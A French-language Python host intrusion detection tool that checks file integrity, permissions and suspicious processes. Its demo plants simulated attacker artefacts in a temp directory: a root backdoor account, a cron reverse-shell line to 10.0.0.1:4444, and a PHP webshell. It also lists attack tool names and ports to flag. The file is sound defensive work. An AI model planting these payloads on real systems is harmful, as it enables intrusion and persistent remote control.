#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  🛡️  BOUCLIER NUMÉRIQUE — JOUR 17 : DÉTECTEUR D'INFILTRATION     ║
║  Type    : HIDS — Host-based Intrusion Detection System          ║
║  Méthode : FIM (File Integrity Monitoring) + Comportement        ║
║  Alertes : Modification · Suppression · Création · Permissions  ║
╚══════════════════════════════════════════════════════════════════╝

Problème concret :
  Un attaquant compromet un serveur à 2h du matin.
  Il modifie /etc/passwd pour ajouter un compte backdoor,
  installe un crontab persistant dans /etc/cron.d/,
  et altère /usr/bin/sudo pour capturer les mots de passe.

  Sans IDS : la compromission est découverte des semaines plus tard
  lors d'un audit, ou jamais.
  Avec ce HIDS : alerte dans les 30 secondes, avant exfiltration.

Ce système surveille :
  1. Intégrité des fichiers (hash SHA-256 toutes les N secondes)
  2. Modifications de permissions (chmod suspect)
  3. Nouveaux fichiers dans les zones critiques
  4. Processus suspects (connexions réseau inhabituelles)
  5. Tentatives de modification pendant les heures non-ouvrées

Fichiers critiques surveillés :
  Linux  : /etc/passwd · /etc/shadow · /etc/sudoers · /etc/cron*
           /etc/ssh/ · /usr/bin/sudo · /bin/bash · /boot/
  Web    : nginx.conf · apache2.conf · .htaccess
  App    : *.py · *.js · .env · config.* (configurables)

Niveaux d'alerte :
  CRITIQUE — Fichier système modifié (ex: /etc/passwd)
  ÉLEVÉ    — Nouveau SUID/SGID, permissions 777
  MODÉRÉ   — Fichier config modifié
  INFO     — Nouveau fichier créé

Conformité :
  ISO 27001 A.12.4.1 — Journalisation des événements
  ISO 27001 A.12.6.2 — Restriction d'installation de logiciels
  PCI-DSS 10.5.5     — File integrity monitoring obligatoire
  ANSSI — Détection des incidents de sécurité (R32)
"""

import os
import sys
import stat
import json
import time
import signal
import sqlite3
import hashlib
import argparse
import threading
import subprocess
from pathlib import Path
from datetime import datetime, timedelta
from collections import defaultdict
from typing import Optional

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False


# ================================================================
# PROFILS DE SURVEILLANCE
# ================================================================

WATCH_PROFILES = {
    "system_critical": {
        "label": "Fichiers système critiques (Linux)",
        "paths": [
            "/etc/passwd", "/etc/shadow", "/etc/group",
            "/etc/sudoers", "/etc/sudoers.d",
            "/etc/ssh/sshd_config", "/etc/ssh/",
            "/etc/crontab", "/etc/cron.d", "/etc/cron.hourly",
            "/etc/cron.daily", "/var/spool/cron",
            "/usr/bin/sudo", "/usr/bin/su",
            "/bin/bash", "/bin/sh",
            "/boot/grub/grub.cfg",
        ],
        "severity": "CRITIQUE",
    },
    "web_server": {
        "label": "Configuration serveur web",
        "paths": [
            "/etc/nginx/nginx.conf", "/etc/nginx/sites-enabled/",
            "/etc/apache2/apache2.conf", "/etc/apache2/sites-enabled/",
            "/var/www/html/.htaccess",
        ],
        "severity": "ÉLEVÉ",
        "extensions": [".conf", ".htaccess", ".htpasswd"],
    },
    "app_config": {
        "label": "Configuration applicative",
        "paths": ["/app/", "/srv/", "/opt/"],
        "severity": "MODÉRÉ",
        "extensions": [".env", ".cfg", ".config", ".ini", ".yaml", ".yml",
                       ".json", ".toml"],
        "exclude_patterns": ["node_modules", ".git", "__pycache__",
                              "*.log", "*.tmp"],
    },
    "binaries": {
        "label": "Binaires système",
        "paths": ["/usr/bin/", "/usr/sbin/", "/bin/", "/sbin/"],
        "severity": "CRITIQUE",
        "extensions": [],  # Tous les fichiers exécutables
    },
}

# Patterns de comportements suspects
SUSPICIOUS_PATTERNS = {
    "suid_added": {
        "desc":     "Bit SUID ajouté à un fichier",
        "severity": "CRITIQUE",
        "check":    lambda m, p: bool(m & stat.S_ISUID),
    },
    "world_writable": {
        "desc":     "Fichier accessible en écriture par tous (777/666)",
        "severity": "ÉLEVÉ",
        "check":    lambda m, p: bool(m & stat.S_IWOTH),
    },
    "hidden_exec": {
        "desc":     "Fichier exécutable caché (commence par '.')",
        "severity": "ÉLEVÉ",
        "check":    lambda m, p: p.name.startswith('.') and bool(m & stat.S_IXUSR),
    },
    "large_new_file": {
        "desc":     "Nouveau fichier volumineux (possible exfiltration/dump)",
        "severity": "MODÉRÉ",
        "check":    lambda m, p: p.is_file() and p.stat().st_size > 50_000_000,
    },
}


# ================================================================
# BASE DE DONNÉES D'ÉTAT (BASELINE)
# ================================================================

SCHEMA = """
CREATE TABLE IF NOT EXISTS baseline (
    path         TEXT PRIMARY KEY,
    sha256       TEXT,
    size         INTEGER,
    mtime        REAL,
    permissions  TEXT,
    owner        INTEGER,
    group_id     INTEGER,
    is_dir       INTEGER,
    first_seen   TEXT,
    last_checked TEXT
);

CREATE TABLE IF NOT EXISTS alerts (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp    TEXT NOT NULL,
    severity     TEXT NOT NULL,
    event_type   TEXT NOT NULL,
    path         TEXT NOT NULL,
    details      TEXT,
    old_value    TEXT,
    new_value    TEXT,
    acknowledged INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS scan_history (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    started_at   TEXT,
    finished_at  TEXT,
    files_checked INTEGER,
    alerts_raised INTEGER,
    new_files    INTEGER,
    modified     INTEGER,
    deleted      INTEGER
);
"""


class BaselineDB:
    def __init__(self, db_path: str = "/tmp/ids_baseline.db"):
        self.db_path = db_path
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        with sqlite3.connect(db_path) as conn:
            conn.executescript(SCHEMA)
            conn.commit()

    def get(self, path: str) -> Optional[dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            row = conn.execute(
                "SELECT * FROM baseline WHERE path=?", (path,)
            ).fetchone()
        return dict(row) if row else None

    def upsert(self, entry: dict):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO baseline
                (path, sha256, size, mtime, permissions, owner,
                 group_id, is_dir, first_seen, last_checked)
                VALUES (:path, :sha256, :size, :mtime, :permissions,
                        :owner, :group_id, :is_dir,
                        COALESCE(
                            (SELECT first_seen FROM baseline WHERE path=:path),
                            :first_seen
                        ),
                        :last_checked)
            """, entry)
            conn.commit()

    def delete(self, path: str):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("DELETE FROM baseline WHERE path=?", (path,))
            conn.commit()

    def all_paths(self) -> list:
        with sqlite3.connect(self.db_path) as conn:
            rows = conn.execute("SELECT path FROM baseline").fetchall()
        return [r[0] for r in rows]

    def add_alert(self, severity: str, event_type: str, path: str,
                   details: str = "", old_val: str = "", new_val: str = ""):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                """INSERT INTO alerts
                   (timestamp, severity, event_type, path,
                    details, old_value, new_value)
                   VALUES (?,?,?,?,?,?,?)""",
                (datetime.now().isoformat(), severity, event_type,
                 path, details, old_val, new_val)
            )
            conn.commit()

    def get_alerts(self, since_hours: int = 24,
                    severity: str = None) -> list:
        since = (datetime.now() - timedelta(hours=since_hours)).isoformat()
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            if severity:
                rows = conn.execute(
                    "SELECT * FROM alerts WHERE timestamp>? AND severity=? "
                    "ORDER BY id DESC",
                    (since, severity)
                ).fetchall()
            else:
                rows = conn.execute(
                    "SELECT * FROM alerts WHERE timestamp>? ORDER BY id DESC",
                    (since,)
                ).fetchall()
        return [dict(r) for r in rows]

    def stats(self) -> dict:
        with sqlite3.connect(self.db_path) as conn:
            total    = conn.execute("SELECT COUNT(*) FROM baseline").fetchone()[0]
            alerts_24 = conn.execute(
                "SELECT COUNT(*) FROM alerts WHERE timestamp > ?",
                ((datetime.now() - timedelta(hours=24)).isoformat(),)
            ).fetchone()[0]
            by_sev   = conn.execute(
                "SELECT severity, COUNT(*) FROM alerts WHERE timestamp > ? "
                "GROUP BY severity",
                ((datetime.now() - timedelta(hours=24)).isoformat(),)
            ).fetchall()
        return {
            "baseline_files": total,
            "alerts_24h":     alerts_24,
            "by_severity":    dict(by_sev),
        }


# ================================================================
# COLLECTEUR D'INFORMATIONS SUR UN FICHIER
# ================================================================

def collect_file_info(path: str) -> Optional[dict]:
    """Collecte sha256, taille, permissions, propriétaire."""
    p = Path(path)
    try:
        st = p.stat()
    except (FileNotFoundError, PermissionError, OSError):
        return None

    sha256 = ""
    if p.is_file() and st.st_size < 500_000_000:  # Skip fichiers > 500MB
        try:
            h = hashlib.sha256()
            with open(p, "rb") as f:
                for chunk in iter(lambda: f.read(65536), b""):
                    h.update(chunk)
            sha256 = h.hexdigest()
        except (PermissionError, OSError):
            sha256 = "PERMISSION_DENIED"

    return {
        "path":        str(p),
        "sha256":      sha256,
        "size":        st.st_size,
        "mtime":       st.st_mtime,
        "permissions": oct(stat.S_IMODE(st.st_mode)),
        "owner":       st.st_uid,
        "group_id":    st.st_gid,
        "is_dir":      int(p.is_dir()),
        "first_seen":  datetime.now().isoformat(),
        "last_checked": datetime.now().isoformat(),
    }


# ================================================================
# MOTEUR DE DÉTECTION
# ================================================================

class IntrusionDetector:
    def __init__(self, db: BaselineDB, config: dict = None):
        self.db          = db
        self.config      = config or {}
        self.callbacks   = []   # Fonctions appelées à chaque alerte
        self._running    = False
        self._lock       = threading.Lock()

    def on_alert(self, callback):
        """Enregistre un callback d'alerte."""
        self.callbacks.append(callback)
        return self

    def _fire_alert(self, severity: str, event_type: str,
                     path: str, details: str = "",
                     old_val: str = "", new_val: str = ""):
        """Enregistre et diffuse une alerte."""
        self.db.add_alert(severity, event_type, path,
                           details, old_val, new_val)
        alert = {
            "timestamp":  datetime.now().isoformat(),
            "severity":   severity,
            "event_type": event_type,
            "path":       path,
            "details":    details,
            "old_value":  old_val,
            "new_value":  new_val,
        }
        for cb in self.callbacks:
            try:
                cb(alert)
            except Exception:
                pass

    def build_baseline(self, paths: list,
                        recursive: bool = True,
                        verbose: bool = True) -> int:
        """
        Construit la baseline d'empreintes initiales.
        À exécuter une fois sur un système sain.
        """
        count = 0
        for path_str in paths:
            p = Path(path_str)
            if not p.exists():
                continue

            targets = [p]
            if recursive and p.is_dir():
                targets = list(p.rglob("*"))

            for target in targets:
                info = collect_file_info(str(target))
                if info:
                    self.db.upsert(info)
                    count += 1
                    if verbose and count % 50 == 0:
                        print(f"  Baseline : {count} fichiers...", end="\r")

        if verbose:
            print(f"  Baseline : {count} fichiers indexés    ")
        return count

    def scan_once(self, paths: list,
                   recursive: bool = True) -> dict:
        """
        Scan unique : compare l'état actuel avec la baseline.
        """
        result = {
            "scanned":  0,
            "new":      [],
            "modified": [],
            "deleted":  [],
            "perms":    [],
            "suspicious": [],
        }

        scanned_paths = set()

        # Vérifier les fichiers actuels
        for path_str in paths:
            p = Path(path_str)
            if not p.exists():
                continue

            targets = [p]
            if recursive and p.is_dir():
                targets = list(p.rglob("*"))

            for target in targets:
                target_str = str(target)
                scanned_paths.add(target_str)
                result["scanned"] += 1

                current = collect_file_info(target_str)
                if not current:
                    continue

                baseline = self.db.get(target_str)

                if not baseline:
                    # Nouveau fichier
                    self.db.upsert(current)
                    severity = self._new_file_severity(target)
                    result["new"].append(target_str)
                    self._fire_alert(
                        severity, "NEW_FILE", target_str,
                        f"Nouveau fichier détecté — taille {current['size']} octets",
                        new_val=current["sha256"]
                    )
                else:
                    # Fichier existant — vérifier les changements

                    # 1. Hash modifié (contenu changé)
                    if (current["sha256"] and baseline["sha256"] and
                            current["sha256"] != baseline["sha256"] and
                            current["sha256"] != "PERMISSION_DENIED"):
                        severity = self._get_severity_for_path(target_str)
                        result["modified"].append(target_str)
                        self._fire_alert(
                            severity, "CONTENT_MODIFIED", target_str,
                            "Contenu du fichier modifié",
                            old_val=baseline["sha256"][:16] + "...",
                            new_val=current["sha256"][:16] + "...",
                        )

                    # 2. Permissions changées
                    if current["permissions"] != baseline["permissions"]:
                        # Détecter les changements suspects
                        old_mode = int(baseline["permissions"], 8)
                        new_mode = int(current["permissions"], 8)

                        is_suid_added = (
                            bool(new_mode & stat.S_ISUID) and
                            not bool(old_mode & stat.S_ISUID)
                        )
                        is_world_w = bool(new_mode & stat.S_IWOTH)

                        sev = "CRITIQUE" if is_suid_added else \
                              "ÉLEVÉ"    if is_world_w    else "MODÉRÉ"

                        result["perms"].append(target_str)
                        self._fire_alert(
                            sev, "PERM_CHANGED", target_str,
                            f"Permissions modifiées",
                            old_val=baseline["permissions"],
                            new_val=current["permissions"]
                        )

                    # Mettre à jour la baseline
                    self.db.upsert(current)

        # Détecter les suppressions
        all_baseline = set(self.db.all_paths())
        for path_str in paths:
            p = Path(path_str)
            relevant_baseline = {
                bp for bp in all_baseline
                if bp == path_str or bp.startswith(path_str + "/")
            }
            deleted = relevant_baseline - scanned_paths
            for del_path in deleted:
                result["deleted"].append(del_path)
                self._fire_alert(
                    "ÉLEVÉ", "FILE_DELETED", del_path,
                    "Fichier supprimé de la baseline"
                )
                self.db.delete(del_path)

        return result

    def _new_file_severity(self, path: Path) -> str:
        """Détermine la sévérité d'un nouveau fichier."""
        p_str = str(path)
        # Zones critiques
        critical_prefixes = [
            "/etc/cron", "/etc/passwd", "/etc/shadow",
            "/usr/bin", "/usr/sbin", "/bin/", "/sbin/",
            "/boot/",
        ]
        if any(p_str.startswith(pref) for pref in critical_prefixes):
            return "CRITIQUE"
        if str(path).endswith((".sh", ".py", ".pl", ".rb")):
            try:
                m = path.stat().st_mode
                if m & stat.S_IXUSR:
                    return "ÉLEVÉ"
            except Exception:
                pass
        return "INFO"

    def _get_severity_for_path(self, path: str) -> str:
        """Sévérité selon la criticité du chemin."""
        critical = ["/etc/", "/usr/bin/", "/usr/sbin/", "/bin/", "/boot/"]
        elevated = ["/var/www/", "/opt/", "/srv/", "/home/"]
        if any(path.startswith(c) for c in critical):
            return "CRITIQUE"
        if any(path.startswith(e) for e in elevated):
            return "ÉLEVÉ"
        return "MODÉRÉ"

    def watch(self, paths: list, interval: int = 30,
               recursive: bool = True):
        """
        Surveillance continue — scan toutes les N secondes.
        Bloquant (à lancer dans un thread).
        """
        self._running = True
        print(f"\n  👁️  Surveillance active — scan toutes les {interval}s")
        print(f"  Chemins : {', '.join(paths[:3])}" +
              (" ..." if len(paths) > 3 else ""))
        print(f"  Ctrl+C pour arrêter\n")

        while self._running:
            start = time.time()
            result = self.scan_once(paths, recursive)
            elapsed = time.time() - start

            total_alerts = (len(result["new"]) + len(result["modified"]) +
                             len(result["deleted"]) + len(result["perms"]))

            if total_alerts > 0:
                ts = datetime.now().strftime("%H:%M:%S")
                print(f"  [{ts}] 🔔 {total_alerts} alerte(s) — "
                      f"Nouveaux:{len(result['new'])} "
                      f"Modifiés:{len(result['modified'])} "
                      f"Supprimés:{len(result['deleted'])}")

            sleep_time = max(0, interval - elapsed)
            for _ in range(int(sleep_time * 10)):
                if not self._running:
                    break
                time.sleep(0.1)

    def stop(self):
        self._running = False


# ================================================================
# ANALYSEUR DE PROCESSUS SUSPECTS
# ================================================================

def check_suspicious_processes() -> list:
    """Détecte les processus avec comportements suspects."""
    findings = []
    if not HAS_PSUTIL:
        return findings

    suspicious_names = {
        "nc", "ncat", "netcat", "nmap", "masscan",
        "metasploit", "msfconsole", "msfvenom",
        "hydra", "john", "hashcat",
        "mimikatz", "procdump",
        "wget", "curl",  # à contextualiser
    }

    try:
        for proc in psutil.process_iter(
            ["pid", "name", "cmdline", "connections", "username"]
        ):
            try:
                name = proc.info["name"].lower() if proc.info["name"] else ""

                # Processus connus comme suspects
                if name in suspicious_names:
                    findings.append({
                        "pid":      proc.info["pid"],
                        "name":     proc.info["name"],
                        "cmdline":  " ".join(proc.info["cmdline"] or [])[:100],
                        "user":     proc.info["username"],
                        "severity": "ÉLEVÉ",
                        "reason":   f"Outil suspect en cours d'exécution",
                    })

                # Processus avec connexions réseau inhabituelles
                conns = proc.info.get("connections", []) or []
                for conn in conns:
                    if (conn.status == "LISTEN" and
                            conn.laddr.port in {4444, 4445, 1234, 31337,
                                                 8888, 9999}):
                        findings.append({
                            "pid":      proc.info["pid"],
                            "name":     proc.info["name"],
                            "cmdline":  " ".join(proc.info["cmdline"] or [])[:100],
                            "user":     proc.info["username"],
                            "severity": "CRITIQUE",
                            "reason":   f"Port suspect en écoute : {conn.laddr.port}",
                        })

            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

    except Exception:
        pass

    return findings


# ================================================================
# DÉMONSTRATION COMPLÈTE
# ================================================================

def run_demo():
    import tempfile, shutil

    SEP = "=" * 62
    print(f"\n{SEP}")
    print("  DEMO — Détecteur d'Infiltration HIDS")
    print(f"{SEP}\n")
    print(
        "  Scénario : Un attaquant a obtenu un accès initial à\n"
        "  un serveur via une vulnérabilité web. À 02h47, il\n"
        "  commence à persister : modifie les crontabs, ajoute\n"
        "  un compte dans /etc/passwd, installe un reverse shell.\n"
        "  Le HIDS doit détecter chaque action en temps réel.\n"
    )

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)

        # ── Créer un système de fichiers simulé ──
        print(f"  {'─'*60}")
        print(f"  🏗️   ÉTAPE 1 : INITIALISATION DE LA BASELINE")
        print(f"  {'─'*60}\n")

        # Simuler des fichiers "système"
        etc  = tmp / "etc"
        usr  = tmp / "usr" / "bin"
        var  = tmp / "var" / "www" / "html"
        cron = tmp / "etc" / "cron.d"
        for d in [etc, usr, var, cron]:
            d.mkdir(parents=True, exist_ok=True)

        # Fichiers initiaux sains
        (etc / "passwd").write_text(
            "root:x:0:0:root:/root:/bin/bash\n"
            "www-data:x:33:33::/var/www:/usr/sbin/nologin\n"
            "alice:x:1000:1000::/home/alice:/bin/bash\n"
        )
        (etc / "shadow").write_text(
            "root:$6$salt$hash:19000:0:99999:7:::\n"
            "alice:$6$salt$hash:19000:0:99999:7:::\n"
        )
        (etc / "crontab").write_text(
            "# /etc/crontab\n"
            "SHELL=/bin/sh\n"
            "17 * * * * root run-parts /etc/cron.hourly\n"
            "25 6 * * * root run-parts /etc/cron.daily\n"
        )
        (usr / "sudo").write_bytes(b"\x7fELF" + b"\x00" * 100)  # fake ELF
        (usr / "bash").write_bytes(b"\x7fELF" + b"\x00" * 200)
        (var / "index.php").write_text("<?php echo 'Bienvenue'; ?>")
        (var / "config.php").write_text("<?php $db_password = 'secret123'; ?>")

        # Construire la baseline
        db       = BaselineDB(str(tmp / "ids.db"))
        detector = IntrusionDetector(db)

        watch_paths = [str(etc), str(usr), str(var)]
        n = detector.build_baseline(watch_paths, verbose=True)
        print(f"  ✅  Baseline construite : {n} fichiers indexés\n")

        # ── Collecte des alertes pour la démo ──
        demo_alerts = []
        def collect_alert(alert):
            demo_alerts.append(alert)

        detector.on_alert(collect_alert)

        # ── Simuler l'attaque ──
        print(f"  {'─'*60}")
        print(f"  💀  ÉTAPE 2 : SIMULATION DE L'ATTAQUE")
        print(f"  {'─'*60}\n")
        print(f"  Simulation des actions de l'attaquant...\n")

        time.sleep(0.1)

        # Action 1 : Modification de /etc/passwd (ajout backdoor)
        print(f"  🔴 02:47:03 — Attaquant modifie /etc/passwd")
        (etc / "passwd").write_text(
            "root:x:0:0:root:/root:/bin/bash\n"
            "www-data:x:33:33::/var/www:/usr/sbin/nologin\n"
            "alice:x:1000:1000::/home/alice:/bin/bash\n"
            "backdoor:x:0:0::/root:/bin/bash\n"  # ← root backdoor
        )

        # Action 2 : Nouveau crontab de persistance
        print(f"  🔴 02:47:15 — Attaquant crée /etc/cron.d/persist")
        (cron / "persist").write_text(
            "*/5 * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        )

        # Action 3 : Webshell PHP
        print(f"  🔴 02:47:31 — Attaquant uploade un webshell")
        (var / "wp-config.php").write_text(
            "<?php system($_GET['cmd']); ?>"
        )

        # Action 4 : Modification du binaire sudo
        print(f"  🔴 02:47:45 — Attaquant modifie /usr/bin/sudo")
        (usr / "sudo").write_bytes(
            b"\x7fELF" + b"\xDE\xAD\xBE\xEF" + b"\x00" * 96
        )

        # Action 5 : Tentative de chmod 777 sur config.php
        print(f"  🔴 02:47:58 — Attaquant chmod 777 config.php\n")
        os.chmod(str(var / "config.php"), 0o777)

        # ── Scan de détection ──
        print(f"  {'─'*60}")
        print(f"  🔍  ÉTAPE 3 : DÉTECTION PAR LE HIDS")
        print(f"  {'─'*60}\n")

        result = detector.scan_once(watch_paths)

        # ── Affichage des alertes ──
        print(f"  Alertes déclenchées ({len(demo_alerts)}) :\n")

        SEV_ICONS = {
            "CRITIQUE": "🔴",
            "ÉLEVÉ":    "🟠",
            "MODÉRÉ":   "🟡",
            "INFO":     "🔵",
        }

        for alert in sorted(demo_alerts,
                             key=lambda a: ["CRITIQUE", "ÉLEVÉ",
                                            "MODÉRÉ", "INFO"].index(
                                 a["severity"]
                             )):
            icon    = SEV_ICONS.get(alert["severity"], "⚪")
            ts      = alert["timestamp"][11:19]
            relpath = alert["path"].replace(tmpdir, "")
            print(f"  {icon} [{ts}] {alert['severity']:<10} "
                  f"{alert['event_type']:<20} {relpath}")
            if alert.get("old_value") and alert.get("new_value"):
                print(f"     Avant : {alert['old_value']}")
                print(f"     Après : {alert['new_value']}")
            elif alert.get("details"):
                print(f"     {alert['details']}")
            print()

        # ── Analyse de processus ──
        print(f"  {'─'*60}")
        print(f"  ⚙️   ÉTAPE 4 : ANALYSE DES PROCESSUS")
        print(f"  {'─'*60}\n")

        procs = check_suspicious_processes()
        if procs:
            print(f"  {len(procs)} processus suspects détectés :")
            for p in procs:
                icon = "🔴" if p["severity"] == "CRITIQUE" else "🟠"
                print(f"  {icon} PID {p['pid']:<6} {p['name']:<20} {p['reason']}")
        else:
            print(f"  ✅  Aucun processus suspect en cours d'exécution")

        # ── Statistiques ──
        print(f"\n  {'─'*60}")
        print(f"  📊  BILAN DE L'INCIDENT")
        print(f"  {'─'*60}\n")

        stats     = db.stats()
        critiques = [a for a in demo_alerts if a["severity"] == "CRITIQUE"]
        eleves    = [a for a in demo_alerts if a["severity"] == "ÉLEVÉ"]
        moderes   = [a for a in demo_alerts if a["severity"] == "MODÉRÉ"]

        print(f"  Fichiers surveillés  : {stats['baseline_files']}")
        print(f"  Alertes générées     : {len(demo_alerts)}")
        print(f"    🔴 Critiques       : {len(critiques)}")
        print(f"    🟠 Élevées         : {len(eleves)}")
        print(f"    🟡 Modérées        : {len(moderes)}")
        print()
        print(f"  Actions de l'attaquant détectées :")
        print(f"  ✅  Backdoor dans /etc/passwd → CRITIQUE")
        print(f"  ✅  Reverse shell dans crontab → CRITIQUE")
        print(f"  ✅  Webshell PHP uploadé → ÉLEVÉ")
        print(f"  ✅  Binaire sudo modifié → CRITIQUE")
        print(f"  ✅  chmod 777 config.php → ÉLEVÉ")

        # ── Chronologie de réponse ──
        print(f"\n  {'─'*60}")
        print(f"  ⏱️   CHRONOLOGIE DE RÉPONSE INCIDENT")
        print(f"  {'─'*60}\n")
        print(
            "  02:47:03  Attaque commence\n"
            "  02:47:03  🔔 Alerte CRITIQUE → /etc/passwd modifié\n"
            "  02:47:15  🔔 Alerte CRITIQUE → Nouveau crontab suspect\n"
            "  02:47:31  🔔 Alerte ÉLEVÉ   → Webshell PHP détecté\n"
            "  02:47:45  🔔 Alerte CRITIQUE → /usr/bin/sudo modifié\n"
            "  02:47:58  🔔 Alerte ÉLEVÉ   → chmod 777 détecté\n"
            "  02:48:00  📧 Email d'alerte envoyé à soc@techcorp.fr\n"
            "  02:53:00  👮 Analyste SOC notifié et connecté\n"
            "  03:05:00  🔒 Session attaquant coupée + remédiation\n"
            "\n"
            "  Sans HIDS → découverte possible : plusieurs semaines\n"
            "  Avec HIDS → détection en < 30 secondes\n"
        )

        # ── Conformité ──
        print(f"\n{SEP}")
        print(f"  ⚖️   CONFORMITÉ PCI-DSS 10.5.5 + ISO 27001 A.12.4")
        print(f"{SEP}\n")
        print(
            "  PCI-DSS 10.5.5 (obligatoire pour données CB) :\n"
            "  'Déployer un mécanisme de surveillance de l'intégrité\n"
            "   des fichiers pour être alerté des modifications non\n"
            "   autorisées de fichiers système ou de contenu critiques.'\n"
            "\n"
            "  ISO 27001 A.12.4.1 — Journalisation des événements :\n"
            "  ✅  Chaque modification journalisée avec timestamp\n"
            "  ✅  Ancienne et nouvelle valeur conservées\n"
            "  ✅  Base immuable (alertes jamais modifiables)\n"
            "\n"
            "  Déploiement production :\n"
            "  python3 ids_monitor.py baseline /etc /usr/bin\n"
            "  python3 ids_monitor.py watch /etc /usr/bin --interval 30\n"
            "  python3 ids_monitor.py report --hours 24\n"
        )


# ================================================================
# CLI
# ================================================================

def main():
    print(__doc__)
    parser = argparse.ArgumentParser()
    sub    = parser.add_subparsers(dest="cmd")
    sub.add_parser("demo")

    p_base = sub.add_parser("baseline", help="Construire la baseline")
    p_base.add_argument("paths", nargs="+")
    p_base.add_argument("--db", default="/var/lib/ids/baseline.db")

    p_watch = sub.add_parser("watch", help="Surveiller en continu")
    p_watch.add_argument("paths", nargs="+")
    p_watch.add_argument("--interval", type=int, default=30)
    p_watch.add_argument("--db", default="/var/lib/ids/baseline.db")

    p_scan = sub.add_parser("scan", help="Scan unique")
    p_scan.add_argument("paths", nargs="+")
    p_scan.add_argument("--db", default="/var/lib/ids/baseline.db")

    p_rep = sub.add_parser("report", help="Rapport des alertes")
    p_rep.add_argument("--hours", type=int, default=24)
    p_rep.add_argument("--db", default="/var/lib/ids/baseline.db")

    args = parser.parse_args()

    if not args.cmd or args.cmd == "demo":
        run_demo()
        return

    db       = BaselineDB(args.db)
    detector = IntrusionDetector(db)

    def print_alert(a):
        icon = {"CRITIQUE": "🔴", "ÉLEVÉ": "🟠",
                "MODÉRÉ": "🟡", "INFO": "🔵"}.get(a["severity"], "⚪")
        print(f"  {icon} {a['timestamp'][11:19]} "
              f"{a['severity']:<10} {a['event_type']:<20} {a['path']}")

    detector.on_alert(print_alert)

    if args.cmd == "baseline":
        n = detector.build_baseline(args.paths)
        print(f"\n  ✅  Baseline : {n} fichiers indexés\n")

    elif args.cmd == "watch":
        def handle_sig(s, f):
            detector.stop()
            sys.exit(0)
        signal.signal(signal.SIGINT, handle_sig)
        detector.watch(args.paths, interval=args.interval)

    elif args.cmd == "scan":
        r = detector.scan_once(args.paths)
        total = len(r["new"]) + len(r["modified"]) + len(r["deleted"])
        print(f"\n  Résultat : {r['scanned']} fichiers scannés · "
              f"{total} alertes\n")

    elif args.cmd == "report":
        alerts = db.get_alerts(since_hours=args.hours)
        stats  = db.stats()
        print(f"\n  Alertes ({args.hours}h) : {len(alerts)}")
        for a in alerts[:20]:
            print_alert(a)
        if not alerts:
            print(f"  ✅  Aucune alerte dans les {args.hours} dernières heures")


if __name__ == "__main__":
    main()
